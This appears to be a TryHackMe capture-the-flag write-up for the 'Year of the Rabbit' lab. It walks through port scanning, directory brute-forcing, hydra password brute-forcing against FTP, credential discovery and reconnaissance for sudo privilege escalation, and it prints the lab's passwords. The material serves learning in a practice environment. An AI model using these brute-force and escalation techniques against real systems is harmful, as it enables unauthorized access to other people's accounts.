
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Year_of_the_rabbit/images/106-1.png)
I started by bruteforcing directories and i found an image which contained a list of possible ftp passwords. After i got the real password i logged in to the ftp server and dowloaded a file which contained encoded credentials which based on the port scanning were likely to be for the ssh server. Once i logged in as eli, i found somewhere in the file directory credentials of other, more privileged user. The privilege escalation to root was done using a CVE.

Let's start with a port scan.

```text
nmap -sV -sC -p21,22,80 10.10.187.110
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 04:40 EDT
Nmap scan report for 10.10.187.110
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

It seems the port 80 has the default ubuntu page. But there may be some hidden directories.

```text
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.187.110/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.187.110/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/24 04:47:36 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```

The only files in this folder are a css file and an audio file. The RickRolled file is not worth checking as it's a joke.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Year_of_the_rabbit/images/106-2.png)

Unexpectedly, the css file poits to a hidden file.

```text
* {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;

```

I usually curl the pages, just to get more info about the page i am fetching.

```text
curl -i http://10.10.187.110/sup3r_s3cr3t_fl4g.php
HTTP/1.1 302 Found
Date: Thu, 24 Sep 2020 09:14:42 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
And there is another hidden directory, which could not be found with any directory brutforcer tool as it's name is not a usual one.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Year_of_the_rabbit/images/106-3.png)

The image is a photo of Lena. Let's get more info about this image.

Among other strings, i found this message alongside few passwords.

```text
strings Hot_Babe.png

Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```
The ideal tool for the password bruteforcing which will be made is hydra.

```text
hydra -l ftpuser -P passwords.txt 10.10.187.110 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-24 05:38:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.187.110:21/
[21][ftp] host: 10.10.187.110   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-24 05:38:53
```

Next i will  enumerate the ftp service.

```text
ftp 10.10.187.110
Connected to 10.10.187.110.
220 (vsFTPd 3.0.2)
Name (10.10.187.110:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 23  2020 .
drwxr-xr-x    2 0        0            4096 Jan 23  2020 ..
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (5.2765 MB/s)
```

The file is encoded in an esoteric language and based on the looks of it, it is called brainfuck. I used this website to decode it: https://copy.sh/brainfuck/
The decoded text contained a user's credentials. I will use them to log in to it's ssh account.

Upon login into the ssh, the message below stand out:
```text
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```
The user flag is in gwendoline's home directory, but with the current permissions it cannot be read.

```text
eli@year-of-the-rabbit:/home/gwendoline$ ls -la
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt
```

I don't know where is the secret folder or what is it's name, but from the message i understand that it is created by root and it is a hidden file. Among many other files is the wanted file.

```text
find / -type f -user root -iname ".*" -ls 2>/dev/null | less
...
295232  156 -rw-r--r--   1 root     root       157687 Apr 13  2015 /usr/src/linux-headers-3.16.0-4-amd64/.config
 36980    4 -rw-r--r--   1 root     root          138 Jan 23  2020 /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
...
```

The message has gwendline's password.
```text
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
Let's login as gwendolin and read the flag. Also, let's see what commands can use as a more privileged user.

```text
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

I can’t use sudo as root, but i can use it as anyone else (eli, or www-data, for example). 

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Year_of_the_rabbit/images/106-4.png)

